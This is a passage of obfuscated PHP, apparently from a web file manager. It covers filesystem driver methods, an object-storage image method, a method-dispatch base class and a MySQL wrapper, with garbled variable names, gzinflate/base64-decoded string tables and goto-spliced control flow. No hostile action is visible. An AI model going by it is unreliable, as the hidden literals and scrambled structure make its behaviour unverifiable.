$this->iconvTo($ÑâÛ“˜¤, $config[$ÃƒúÀ»[1477]], $config[$ÃƒúÀ»[1476]]); } public function iconvSystem($ë®†Œâ³) { $´Ş¯³² =& $_SERVER[Î·Ü›öğ]; global $config; return $this->iconvTo($ë®†Œâ³, $config[$´Ş¯³²[1476]], $config[$´Ş¯³²[1477]]); } public function getPathOuter($™‹ø´Ö) { $ò»û¨Ë =& $_SERVER[Î·Ü›öğ]; $‹İìâö¡ = $this->iconvApp($this->pathBase); $™‹ø´Ö = $this->iconvApp($™‹ø´Ö); if (substr($‹İìâö¡, 0, 2) == $ò»û¨Ë[1448]) { $‹İìâö¡ = BASIC_PATH . substr($‹İìâö¡, 2); } if (substr($™‹ø´Ö, 0, 2) == $ò»û¨Ë[1448]) { $™‹ø´Ö = BASIC_PATH . substr($™‹ø´Ö, 2); } $‹İìâö¡ = KodIO::clear($‹İìâö¡); $™‹ø´Ö = KodIO::clear($™‹ø´Ö); $™‹ø´Ö = substr($™‹ø´Ö, strlen($‹İìâö¡)); if (empty($this->pathDriver)) { return $™‹ø´Ö; } return $this->pathDriver . $ò»û¨Ë[8] . ltrim($™‹ø´Ö, $ò»û¨Ë[8]); } public function mkfile($³ÍçÕ™, $“©¡½¬ã = '', $üû¹å›Ù = REPEAT_RENAME) { $³ÍçÕ™ = $this->iconvSystem($³ÍçÕ™); @touch($³ÍçÕ™); if ($“©¡½¬ã) { file_put_contents($³ÍçÕ™, $“©¡½¬ã); } @chmod($³ÍçÕ™, $this->pathAuth); if (is_file($³ÍçÕ™)) { return $this->getPathOuter($³ÍçÕ™); } $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } public function mkdir($ïùªóÙ§, $ï–ğ–˜ = REPEAT_SKIP) { $ïùªóÙ§ = $this->iconvSystem($ïùªóÙ§); if (is_dir($ïùªóÙ§)) { return $this->getPathOuter($ïùªóÙ§); } @mkdir($ïùªóÙ§, $this->pathAuth, !0); @chmod($ïùªóÙ§, $this->pathAuth); if (is_dir($ïùªóÙ§)) { return $this->getPathOuter($ïùªóÙ§); } $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } public function copyFile($½Êë¼œ, $ª­æ‚ìó) { $this->mkdir($this->pathFather($ª­æ‚ìó)); $½Êë¼œ = $this->iconvSystem($½Êë¼œ); $ª­æ‚ìó = $this->iconvSystem($ª­æ‚ìó); $Ÿ¯Î·¬— = copy_64($½Êë¼œ, $ª­æ‚ìó); @chmod($ª­æ‚ìó, $this->pathAuth); if ($Ÿ¯Î·¬—) { return $this->getPathOuter($ª­æ‚ìó); } $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } public function moveFile($†´¯Óñ°, $À¿”ºß) { $this->mkdir($this->pathFather($À¿”ºß)); $†´¯Óñ° = $this->iconvSystem($†´¯Óñ°); $À¿”ºß = $this->iconvSystem($À¿”ºß); $¨Ğé€© = intval(@rename($†´¯Óñ°, $À¿”ºß)); if (!$¨Ğé€©) { if ($¨Ğé€© = intval(@copy_64($†´¯Óñ°, $À¿”ºß))) { @unlink($†´¯Óñ°); } } @chmod($À¿”ºß, $this->pathAuth); if ($¨Ğé€©) { return $this->getPathOuter($À¿”ºß); } $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } public function movePath($¥Ä·†£, $Î•ø¯¤, $òâ—‡¬ù = false) { $ÃÈÃŒ‘ã =& $_SERVER[Î·Ü›öğ]; $¥Ä·†£ = $this->iconvSystem($¥Ä·†£); $Î•ø¯¤ = $this->iconvSystem($Î•ø¯¤); $Âğ¾‰ãÖ = rtrim($Î•ø¯¤, $ÃÈÃŒ‘ã[8]) . $ÃÈÃŒ‘ã[8] . ($òâ—‡¬ù ? $òâ—‡¬ù : get_path_this($¥Ä·†£)); if (file_exists($Âğ¾‰ãÖ)) { return !1; } $³Ò´¸Å = intval(@rename($¥Ä·†£, $Âğ¾‰ãÖ)); $³Ò´¸Å = file_exists($Âğ¾‰ãÖ); if ($³Ò´¸Å) { return $this->getPathOuter($Âğ¾‰ãÖ); } $this->writeLog(__FUNCTION__ . $ÃÈÃŒ‘ã[1488], !0); return !1; } public function delFile($¦§ÇÍ¼œ) { $¦§ÇÍ¼œ = $this->iconvSystem($¦§ÇÍ¼œ); if (!@unlink($¦§ÇÍ¼œ)) { @chmod($¦§ÇÍ¼œ, $this->pathAuth); if (@unlink($¦§ÇÍ¼œ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } return !0; } public function delFolder($ç ø£ı¥) { $”«ĞÖ±Î =& $_SERVER[Î·Ü›öğ]; $ç ø£ı¥ = $this->iconvSystem($ç ø£ı¥); if (!is_dir($ç ø£ı¥)) { return !0; } if (!($âçÜ³Äí = opendir($ç ø£ı¥))) { return !1; } while (($á‘÷Î–² = readdir($âçÜ³Äí)) !== !1) { if ($á‘÷Î–² == $”«ĞÖ±Î[10] || $á‘÷Î–² == $”«ĞÖ±Î[1393]) { continue; } $“Ïî£ê = $ç ø£ı¥ . $”«ĞÖ±Î[8] . $á‘÷Î–²; if (is_file($“Ïî£ê) || is_link($“Ïî£ê)) { if (!unlink($“Ïî£ê)) { chmod($“Ïî£ê, $this->pathAuth); if (!unlink($“Ïî£ê)) { return !1; } } } else { if (is_dir($“Ïî£ê)) { chmod($“Ïî£ê, $this->pathAuth); $“Ïî£ê = $this->iconvApp($“Ïî£ê); if (!$this->delFolder($“Ïî£ê)) { return !1; } } } } closedir($âçÜ³Äí); return rmdir($ç ø£ı¥); } public function rename($Ê¤­ , $¶Ùú¸õ¡) { $Ï¶§¾…Ñ =& $_SERVER[Î·Ü›öğ]; $ŒãËä‡ú = $this->fileNameAuto($this->pathFather($Ê¤­ ), $¶Ùú¸õ¡); $ŒãËä‡ú = $this->iconvSystem($ŒãËä‡ú); $Ê¤­  = $this->iconvSystem($Ê¤­ ); $ä¾¿çÓŠ = $this->pathFather($Ê¤­ ); $ãÒ…œåƒ = rtrim($ä¾¿çÓŠ, $Ï¶§¾…Ñ[8]) . $Ï¶§¾…Ñ[8] . $ŒãËä‡ú; $Õí‘éÔË = @rename($Ê¤­ , $ãÒ…œåƒ); $ãÒ…œåƒ = $this->iconvApp($ãÒ…œåƒ); if ($Õí‘éÔË) { return $this->getPathOuter($ãÒ…œåƒ); } $this->writeLog(__FUNCTION__ . $Ï¶§¾…Ñ[1488], !0); return !1; } public function size($ˆ­á„Ëş) { $ˆ­á„Ëş = $this->iconvSystem($ˆ­á„Ëş); return filesize_64($ˆ­á„Ëş); } public function info($îæá‡£) { $îæá‡£ = $this->iconvSystem($îæá‡£); if ($this->isFolder($îæá‡£)) { return $this->folderInfo($îæá‡£); } else { if ($this->isFile($îæá‡£)) { return $this->fileInfo($îæá‡£); } } return !1; } protected function infoChildren($“îÀØóÛ, &$ş¿¦ø½É, $«¡¥Õìš = true) { $ı¨ìƒ¥ñ =& $_SERVER[Î·Ü›öğ]; check_abort_echo(); $“îÀØóÛ = rtrim($“îÀØóÛ, $ı¨ìƒ¥ñ[8]) . $ı¨ìƒ¥ñ[8]; if ($«¡¥Õìš) { $“îÀØóÛ = $this->iconvSystem($“îÀØóÛ); } if (!($ÑãŠ§Âğ = @opendir($“îÀØóÛ))) { return; } while (($°¬„ø¶³ = readdir($ÑãŠ§Âğ)) !== !1) { if ($°¬„ø¶³ == $ı¨ìƒ¥ñ[10] || $°¬„ø¶³ == $ı¨ìƒ¥ñ[1393]) { continue; } $ï»˜˜”á = $“îÀØóÛ . $°¬„ø¶³; if (is_file($ï»˜˜”á) || is_link($ï»˜˜”á)) { $ş¿¦ø½É[$ı¨ìƒ¥ñ[80]]++; $ş¿¦ø½É[$ı¨ìƒ¥ñ[79]] += filesize_64($ï»˜˜”á); } else { if (is_dir($ï»˜˜”á)) { $ş¿¦ø½É[$ı¨ìƒ¥ñ[81]]++; $this->infoChildren($ï»˜˜”á, $ş¿¦ø½É, !1); } } } closedir($ÑãŠ§Âğ); } private function folderInfo($¶†´Ğ†€, $·ÀóÏÅÉ = false) { $¿úè¢ô» =& $_SERVER[Î·Ü›öğ]; $¶†´Ğ†€ = rtrim($¶†´Ğ†€, $¿úè¢ô»[8]) . $¿úè¢ô»[8]; $áùÂä = $this->iconvApp($this->pathThis($¶†´Ğ†€)); if ($·ÀóÏÅÉ) { return array($¿úè¢ô»[32] => $áùÂä, $¿úè¢ô»[87] => $this->getPathOuter($¶†´Ğ†€), $¿úè¢ô»[33] => $¿úè¢ô»[78]); } $¿…ôÌŞ = array($¿úè¢ô»[32] => $áùÂä, $¿úè¢ô»[87] => $this->getPathOuter($¶†´Ğ†€), $¿úè¢ô»[33] => $¿úè¢ô»[78], $¿úè¢ô»[234] => @filectime($¶†´Ğ†€), $¿úè¢ô»[88] => @filemtime($¶†´Ğ†€), $¿úè¢ô»[1492] => @fileatime($¶†´Ğ†€), $¿úè¢ô»[1493] => is_readable($¶†´Ğ†€), $¿úè¢ô»[1494] => is_writable($¶†´Ğ†€), $¿úè¢ô»[1495] => get_mode($¶†´Ğ†€)); return $¿…ôÌŞ; } private function fileInfo($èê®®„, $ûÌ­Ë±± = false) { $™Õ·¶í‡ =& $_SERVER[Î·Ü›öğ]; $¹—Ò‘ëÄ = $this->iconvApp($this->pathThis($èê®®„)); if ($ûÌ­Ë±±) { return array($™Õ·¶í‡[32] => $¹—Ò‘ëÄ, $™Õ·¶í‡[87] => $this->getPathOuter($èê®®„), $™Õ·¶í‡[33] => $™Õ·¶í‡[233], $™Õ·¶í‡[79] => $this->size($èê®®„), $™Õ·¶í‡[169] => $this->ext($¹—Ò‘ëÄ)); } $ë€„³ = array($™Õ·¶í‡[32] => $¹—Ò‘ëÄ, $™Õ·¶í‡[87] => $this->getPathOuter($èê®®„), $™Õ·¶í‡[33] => $™Õ·¶í‡[233], $™Õ·¶í‡[234] => @filectime($èê®®„), $™Õ·¶í‡[88] => @filemtime($èê®®„), $™Õ·¶í‡[1492] => @fileatime($èê®®„), $™Õ·¶í‡[79] => $this->size($èê®®„), $™Õ·¶í‡[169] => $this->ext($¹—Ò‘ëÄ), $™Õ·¶í‡[1493] => is_readable($èê®®„), $™Õ·¶í‡[1494] => is_writable($èê®®„), $™Õ·¶í‡[1495] => get_mode($èê®®„)); return $ë€„³; } public function exist($°¼ù‚ÎÁ) { $°¼ù‚ÎÁ = $this->iconvSystem($°¼ù‚ÎÁ); return @file_exists($°¼ù‚ÎÁ); } public function isFile($ÕË‘©Õ) { $ÕË‘©Õ = $this->iconvSystem($ÕË‘©Õ); return @is_file($ÕË‘©Õ); } public function isFolder($¢‚úéö®) { $¢‚úéö® = $this->iconvSystem($¢‚úéö®); return @is_dir($¢‚úéö®); } public function listPath($ªî÷ç÷›, $ ¹°š€º = false) { $Í¹úÊÎÎ =& $_SERVER[Î·Ü›öğ]; $ªî÷ç÷› = $this->iconvSystem($ªî÷ç÷›); $ªî÷ç÷› = rtrim($ªî÷ç÷›, $Í¹úÊÎÎ[8]) . $Í¹úÊÎÎ[8]; $ğ³Ò¹Ü„ = array($Í¹úÊÎÎ[85] => array(), $Í¹úÊÎÎ[86] => array()); if (!($ŠõË½¬Ş = @opendir($ªî÷ç÷›))) { return $ğ³Ò¹Ü„; } while (($òû‰ôõü = readdir($ŠõË½¬Ş)) !== !1) { if ($òû‰ôõü == $Í¹úÊÎÎ[10] || $òû‰ôõü == $Í¹úÊÎÎ[1393]) { continue; } $­ò§ÁÓ· = $ªî÷ç÷› . $òû‰ôõü; if (is_file($­ò§ÁÓ·)) { $ğ³Ò¹Ü„[$Í¹úÊÎÎ[86]][] = $this->fileInfo($­ò§ÁÓ·, $ ¹°š€º); } else { $ğ³Ò¹Ü„[$Í¹úÊÎÎ[85]][] = $this->folderInfo($­ò§ÁÓ·, $ ¹°š€º); } } closedir($ŠõË½¬Ş); return $ğ³Ò¹Ü„; } public function listAll($É à•â¹, &$úˆÙ˜£Í = array()) { $›Á¢·ƒ‚ =& $_SERVER[Î·Ü›öğ]; $É à•â¹ = $this->iconvSystem($É à•â¹); $É à•â¹ = rtrim($É à•â¹, $›Á¢·ƒ‚[8]) . $›Á¢·ƒ‚[8]; if (!($ÁØ­Ÿ¿½ = @opendir($É à•â¹))) { return $úˆÙ˜£Í; } while (($œÏÈ Ä˜ = readdir($ÁØ­Ÿ¿½)) !== !1) { if ($œÏÈ Ä˜ == $›Á¢·ƒ‚[10] || $œÏÈ Ä˜ == $›Á¢·ƒ‚[1393]) { continue; } $ªù­·º = $É à•â¹ . $œÏÈ Ä˜; $¶…ˆ€˜– = is_dir($ªù­·º) && !is_link($ªù­·º) ? 1 : 0; $ªù­·º = $¶…ˆ€˜– ? $ªù­·º . $›Á¢·ƒ‚[8] : $ªù­·º; $úˆÙ˜£Í[] = array($›Á¢·ƒ‚[87] => $this->getPathOuter($ªù­·º), $›Á¢·ƒ‚[78] => $¶…ˆ€˜–, $›Á¢·ƒ‚[88] => intval(@filemtime($ªù­·º)), $›Á¢·ƒ‚[79] => $¶…ˆ€˜– ? 0 : intval($this->size($ªù­·º))); if ($¶…ˆ€˜–) { $this->listAll($ªù­·º, $úˆÙ˜£Í); } } closedir($ÁØ­Ÿ¿½); return $úˆÙ˜£Í; } public function has($¹ç»ÕÃÊ, $£©ô×Í = false, $’®À¦Ğ£ = true) { $ïÁ…·†î =& $_SERVER[Î·Ü›öğ]; $¹ç»ÕÃÊ = $this->iconvSystem($¹ç»ÕÃÊ); $¹ç»ÕÃÊ = rtrim($¹ç»ÕÃÊ, $ïÁ…·†î[8]) . $ïÁ…·†î[8]; if (!($­‰á·•’ = @opendir($¹ç»ÕÃÊ))) { return !1; } $°ä–‡›Û = 0; $ãáÓ©·¦ = 0; $Ìèœåú = 0; while (($Ğì„óÜñ = readdir($­‰á·•’)) !== !1) { if ($Ğì„óÜñ == $ïÁ…·†î[10] || $Ğì„óÜñ == $ïÁ…·†î[1393]) { continue; } $¸„”§íÓ = $¹ç»ÕÃÊ . $Ğì„óÜñ; if ($£©ô×Í) { $Ìèœåú++; if (@is_file($¸„”§íÓ)) { $°ä–‡›Û++; } else { $ãáÓ©·¦++; } if ($Ìèœåú > 10000) { break; } continue; } if ($’®À¦Ğ£) { if (@is_file($¸„”§íÓ)) { return !0; } } else { if (@is_dir($¸„”§íÓ . $ïÁ…·†î[8])) { return !0; } } } closedir($­‰á·•’); if ($£©ô×Í) { return array($ïÁ…·†î[242] => $°ä–‡›Û, $ïÁ…·†î[243] => $ãáÓ©·¦); } return !1; } public function hashSimple($¿©ı¸»‘) { $º÷ÁÄ–ñ =& $_SERVER[Î·Ü›öğ]; if (!$¿©ı¸»‘) { return md5($º÷ÁÄ–ñ[12]); } $¿©ı¸»‘ = $this->iconvSystem($¿©ı¸»‘); $Ò’ş¦Ê¥ = $this->size($¿©ı¸»‘); $ÖÄ©îê = 200; $è‡ğƒœˆ = 50; if ($Ò’ş¦Ê¥ <= $ÖÄ©îê * $è‡ğƒœˆ) { return $this->hashMd5($¿©ı¸»‘) . $Ò’ş¦Ê¥; } $ÍšÎİ™Ş = $º÷ÁÄ–ñ[12]; $°ûÑÑ = intval($Ò’ş¦Ê¥ / $è‡ğƒœˆ); $å÷¿„±¨ = fopen($¿©ı¸»‘, $º÷ÁÄ–ñ[1496]); if (!$å÷¿„±¨) { return $ÍšÎİ™Ş; } for ($­ÈË ìÅ = 0; $­ÈË ìÅ < $è‡ğƒœˆ; $­ÈË ìÅ++) { fseek_64($å÷¿„±¨, $°ûÑÑ * $­ÈË ìÅ); $ÍšÎİ™Ş .= fread($å÷¿„±¨, $ÖÄ©îê); } fseek_64($å÷¿„±¨, $Ò’ş¦Ê¥ - $ÖÄ©îê); $ÍšÎİ™Ş .= fread($å÷¿„±¨, $ÖÄ©îê); fclose($å÷¿„±¨); return md5($ÍšÎİ™Ş) . $Ò’ş¦Ê¥; } public function getContent($ˆ›“Ÿ¼) { $ˆ›“Ÿ¼ = $this->iconvSystem($ˆ›“Ÿ¼); return file_get_contents($ˆ›“Ÿ¼); } public function setContent($Á•„ƒ, $ëïİ¬ˆÄ = '') { $Á•„ƒ = $this->iconvSystem($Á•„ƒ); $¸¯œç¤” = @file_put_contents($Á•„ƒ, $ëïİ¬ˆÄ, LOCK_EX); if (!$¸¯œç¤”) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); } clearstatcache(); @chmod($Á•„ƒ, $this->pathAuth); return $¸¯œç¤” === !1 ? !1 : !0; } public function fileSubstr($Åª¹ê¢, $–‡ğîí = 0, $”¦´¨¾· = false) { $úÚğÕô =& $_SERVER[Î·Ü›öğ]; $Åª¹ê¢ = $this->iconvSystem($Åª¹ê¢); if ($”¦´¨¾· === !1) { $”¦´¨¾· = $this->size($Åª¹ê¢); } if ($”¦´¨¾· <= 0) { return $úÚğÕô[12]; } $ı¼Ç£õ = fopen($Åª¹ê¢, $úÚğÕô[1496]); if (!$ı¼Ç£õ) { return !1; } fseek_64($ı¼Ç£õ, $–‡ğîí); $¢‹à·ä = fread($ı¼Ç£õ, $”¦´¨¾·); fclose($ı¼Ç£õ); if (!$¢‹à·ä) { $this->writeLog(__FUNCTION__ . $úÚğÕô[1488], !0); } return $¢‹à·ä; } public function upload($”ŒßÉ‚», $ÙŒ¯Ç †, $ÖÌù‹½Ç = false, $°ôöÚªº = REPEAT_REPLACE) { if ($ÖÌù‹½Ç) { return $this->moveFile($ÙŒ¯Ç †, $”ŒßÉ‚»); } return $this->copyFile($ÙŒ¯Ç †, $”ŒßÉ‚»); } public function setModifyTime($Ú¡×°æ´, $Àƒ¨Ûµ® = '') { @touch($Ú¡×°æ´, intval($Àƒ¨Ûµ®)); } public function download($¤¡ñË†ø, $ØÁ¡çÅî) { return $this->iconvSystem($¤¡ñË†ø); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ ˜“ÛÃ”) { parent::__construct($ ˜“ÛÃ”); $this->setSignVersion($_SERVER[Î·Ü›öğ][250]); } public function fileOutImage($Ú Á”òä, $¨º•Ù˜ø = 250) { $ù®ƒŒ›È =& $_SERVER[Î·Ü›öğ]; if ($this->size($Ú Á”òä) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ú Á”òä, $¨º•Ù˜ø); } $¬ÃÒøÏå = array($ù®ƒŒ›È[1497] => $ù®ƒŒ›È[1498] . $¨º•Ù˜ø . $ù®ƒŒ›È[1499]); $îàÑñÁ = $this->link($Ú Á”òä, $¬ÃÒøÏå); $this->fileOutLink($îàÑñÁ); } } goto aŠòˆœ¹‘Á; B‚­´º„¯¢: if (!$dkcsutgroi) { return; } $_SERVER[Ò¼î¯­] = explode($_SERVER[Î·Ü›öğ][696], gzinflate(substr($_SERVER[Î·Ü›öğ][697], 10, -8))); $zfvktopyjc = $_SERVER[Î·Ü›öğ][698]; goto döÄÒ•²Á‡; F¯áÒ’®ñˆ: function binCheckBigger($íã¯«î, $•Šü£æ) { return $íã¯«î > $•Šü£æ; } $_SERVER[$_SERVER[¯ÜüøÑ­][3]] = (strrev('6778').base64_decode('ODE='))+0;$_ar12="zaq54279386dxbwr1nemg0yfthpklijsucovb8qi0tsahpkuj6n52yvdl9rxz1e3fwmo4";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ìñã›ù, $¿ØÑ¯‚) { $¾ÕùÆ¦Æ =& $_SERVER[Î·Ü›öğ]; if (isset(self::$_methodList[$Ìñã›ù])) { return @call_user_func_array(self::$_methodList[$Ìñã›ù], $¿ØÑ¯‚); } else { if (method_exists($this, $Ìñã›ù)) { return call_user_func_array(array($this, $Ìñã›ù), $¿ØÑ¯‚); } else { think_exception(__CLASS__ . $¾ÕùÆ¦Æ[4] . $Ìñã›ù . $¾ÕùÆ¦Æ[5]); } } } public static function __callStatic($‰øóŸÖ—, $ÜÅ“åÅï) { if (isset(self::$_methodListStatic[$‰øóŸÖ—])) { return call_user_func_array(self::$_methodListStatic[$‰øóŸÖ—], $ÜÅ“åÅï); } else { if (method_exists(self, $‰øóŸÖ—)) { return call_user_func_array(array(self, $‰øóŸÖ—), $ÜÅ“åÅï); } else { show_json("{$‰øóŸÖ—}\x28\x29\x20\156\157\x74\40\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($¿Ãæ„ƒĞ, $™ÜêÛŸ) { self::$_methodList[$¿Ãæ„ƒĞ] = $™ÜêÛŸ; } public static function addMethodStatic($â‡…îˆé, $èí¹¶Èß) { self::$_methodListStatic[$â‡…îˆé] = $èí¹¶Èß; } } goto B„†‡ĞµÚÄ; dİ†Ê«©: $fileSize = strrev(base64_decode($_SERVER[¯ÜüøÑ­][0])); function binCheckNeq($Ó†ËÍˆû, $£°­È¸‚) { return $Ó†ËÍˆû != $£°­È¸‚; } $_SERVER[$_SERVER[¯ÜüøÑ­][1]] = $fileSize($_SERVER[$_SERVER[¯ÜüøÑ­][2]]); goto F¯áÒ’®ñˆ; C°„…¥±‚: class DbMysqli extends Db { public function __construct($¬¹ÏŸ¨ = '') { $×‡œ®ÄÎ =& $_SERVER[Î·Ü›öğ]; if (!extension_loaded($×‡œ®ÄÎ[1011])) { think_exception(think_lang($×‡œ®ÄÎ[14]) . $×‡œ®ÄÎ[1012]); } if (!empty($¬¹ÏŸ¨)) { $this->config = $¬¹ÏŸ¨; if (empty($this->config[$×‡œ®ÄÎ[17]])) { $this->config[$×‡œ®ÄÎ[17]] = $×‡œ®ÄÎ[12]; } } } public function connect($¼˜æ¼ĞÉ = '', $”˜ˆòâÜ = 0) { $”ú„›Ş˜ =& $_SERVER[Î·Ü›öğ]; if (!isset($this->linkID[$”˜ˆòâÜ])) { if (empty($¼˜æ¼ĞÉ)) { $¼˜æ¼ĞÉ = $this->config; } $this->linkID[$”˜ˆòâÜ] = new mysqli($¼˜æ¼ĞÉ[$”ú„›Ş˜[985]], $¼˜æ¼ĞÉ[$”ú„›Ş˜[987]], $¼˜æ¼ĞÉ[$”ú„›Ş˜[988]], $¼˜æ¼ĞÉ[$”ú„›Ş˜[21]], $¼˜æ¼ĞÉ[$”ú„›Ş˜[986]] ? intval($¼˜æ¼ĞÉ[$”ú„›Ş˜[986]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $íÑ©é– = $this->linkID[$”˜ˆòâÜ]->server_version; $this->linkID[$”˜ˆòâÜ]->query($”ú„›Ş˜[989] . think_config($”ú„›Ş˜[990]) . $”ú„›Ş˜[58]); if ($íÑ©é– > $”ú„›Ş˜[991]) { $this->linkID[$”˜ˆòâÜ]->query($”ú„›Ş˜[992]); } $this->connected = !0; if (1 != think_config($”ú„›Ş˜[22])) { unset($this->config); } } return $this->linkID[$”˜ˆòâÜ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÇËˆäò) { $Š§¢¨ñÙ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÇËˆäò; if ($this->queryID) { $this->free(); } think_action_status($Š§¢¨ñÙ[23], 1); think_status($Š§¢¨ñÙ[24]); $this->queryID = $this->_linkID->query($ÇËˆäò); if ($this->_linkID->more_results()) { while (($º¢âò¯ = $this->_linkID->next_result()) != NULL) { $º¢âò¯->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ŒœÌØ¿ì) { $ñ—Ì®î½ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒœÌØ¿ì; if ($this->queryID) { $this->free(); } think_action_status($ñ—Ì®î½[25], 1); think_status($ñ—Ì®î½[24]); $¼ş‰´Ç = $this->_linkID->query($ŒœÌØ¿ì); $this->debug(); if (!1 === $¼ş‰´Ç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä‘€…·‡ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ä‘€…·‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $äş¶×æ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$äş¶×æ) { $this->error(); return !1; } } return !0; } private function getAll() { $Åñ‹üÅ— = array(); if ($this->numRows > 0) { for ($ˆğé±¬Ù = 0; $ˆğé±¬Ù < $this->numRows; $ˆğé±¬Ù++) { $Åñ‹üÅ—[$ˆğé±¬Ù] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Åñ‹üÅ—; } public function getFields($õÖù¦õÃ) { $ãÓ·â‡• =& $_SERVER[Î·Ü›öğ]; $”å¢‰Ñ· = $this->query($ãÓ·â‡•[996] . $this->parseKey($õÖù¦õÃ)); $…ü»ó®Æ = array(); if ($”å¢‰Ñ·) { foreach ($”å¢‰Ñ· as $„ºÕ§  => $éö‡ƒ„÷) { $…ü»ó®Æ[$éö‡ƒ„÷[$ãÓ·â‡•[31]]] = array($ãÓ·â‡•[32] => $éö‡ƒ„÷[$ãÓ·â‡•[31]], $ãÓ·â‡•[33] => $éö‡ƒ„÷[$ãÓ·â‡•[34]], $ãÓ·â‡•[35] => (bool) ($éö‡ƒ„÷[$ãÓ·â‡•[36]] === $ãÓ·â‡•[12]), $ãÓ·â‡•[37] => $éö‡ƒ„÷[$ãÓ·â‡•[38]], $ãÓ·â‡•[39] => strtolower($éö‡ƒ„÷[$ãÓ·â‡•[40]]) == $ãÓ·â‡•[41], $ãÓ·â‡•[42] => strtolower($éö‡ƒ„÷[$ãÓ·â‡•[43]]) == $ãÓ·â‡•[44]); } } return $…ü»ó®Æ; } public function getTables($¿ˆÊÎ·§ = '') { $«ğóÛ‘ı =& $_SERVER[Î·Ü›öğ]; $®ØËğìÒ = !empty($¿ˆÊÎ·§) ? $«ğóÛ‘ı[998] . $¿ˆÊÎ·§ . $«ğóÛ‘ı[999] : $«ğóÛ‘ı[1000]; $Ö†İ²œ = $this->query($®ØËğìÒ); $ĞÔôª£— = array(); if ($Ö†İ²œ) { foreach ($Ö†İ²œ as $÷“ª¸ƒ³ => $ˆ¿±¬Î€) { $ĞÔôª£—[$÷“ª¸ƒ³] = current($ˆ¿±¬Î€); } } return $ĞÔôª£—; } public function replace($¥è¬ó”, $ÏËÒÔñŠ = array()) { $àÕ¯Á¸ø =& $_SERVER[Î·Ü›öğ]; foreach ($¥è¬ó” as $¼ÛÚ¤õ› => $‡ÁÄ‘¿Ó) { $ŒÑıñÉš = $this->parseValue($‡ÁÄ‘¿Ó); if (is_scalar($ŒÑıñÉš)) { $µº¡©‡Ö[] = $ŒÑıñÉš; $Õûıá˜Í[] = $this->parseKey($¼ÛÚ¤õ›); } } $†¯Õõç = $àÕ¯Á¸ø[1001] . $this->parseTable($ÏËÒÔñŠ[$àÕ¯Á¸ø[359]]) . $àÕ¯Á¸ø[1002] . implode($àÕ¯Á¸ø[50], $Õûıá˜Í) . $àÕ¯Á¸ø[1003] . implode($àÕ¯Á¸ø[50], $µº¡©‡Ö) . $àÕ¯Á¸ø[1004]; return $this->execute($†¯Õõç); } public function insertAll($Ë”»Êñú, $öÕÊëõö = array(), $²¹£äüè = false) { $ş’‘Ğâ• =& $_SERVER[Î·Ü›öğ]; if (!is_array($Ë”»Êñú[0])) { return !1; } $ïõ°ºüº = array_keys($Ë”»Êñú[0]); $¼ì¡ Ğ† = array(); foreach ($Ë”»Êñú as $êŸÊ²ÅÌ) { $ÎØäµ·é = array(); foreach ($êŸÊ²ÅÌ as $Áš‰ŠŒß => $Îøå—€–) { $Îøå—€– = $this->parseValue($Îøå—€–); if (is_scalar($Îøå—€–)) { $ÎØäµ·é[] = $Îøå—€–; } } $¼ì¡ Ğ†[] = $ş’‘Ğâ•[340] . implode($ş’‘Ğâ•[50], $ÎØäµ·é) . $ş’‘Ğâ•[1004]; } array_walk($ïõ°ºüº, array($this, $ş’‘Ğâ•[1005])); $¢ÚÒÎ°Î = $²¹£äüè ? $ş’‘Ğâ•[1006] : $ş’‘Ğâ•[1007]; $ıÉé„Æö = $¢ÚÒÎ°Î . $ş’‘Ğâ•[1008] . $this->parseTable($öÕÊëõö[$ş’‘Ğâ•[359]]) . $ş’‘Ğâ•[1002] . implode($ş’‘Ğâ•[50], $ïõ°ºüº) . $ş’‘Ğâ•[1009] . implode($ş’‘Ğâ•[50], $¼ì¡ Ğ†); return $this->execute($ıÉé„Æö); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $°‚Ğ¡œ· =& $_SERVER[Î·Ü›öğ]; $this->error = $this->_linkID->errno . $°‚Ğ¡œ·[4] . $this->_linkID->error; if ($°‚Ğ¡œ·[12] != $this->queryStr) { $this->error .= LNG($°‚Ğ¡œ·[48]) . $this->queryStr; } think_trace($this->error, $°‚Ğ¡œ·[12], $°‚Ğ¡œ·[49]); return $this->error; } public function escapeString($¶¡Û‘ä›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¶¡Û‘ä›); } else { return addslashes($¶¡Û‘ä›); } } public function parseKey(&$¶˜ñ‚¤Õ, $çöÛ‡”Ó = true) { $»Ú½«Œ” =& $_SERVER[Î·Ü›öğ]; if ($çöÛ‡”Ó) { $¶˜ñ‚¤Õ = $this->parseKeyCheck($¶˜ñ‚¤Õ); } if ($¶˜ñ‚¤Õ != $»Ú½«Œ”[223] 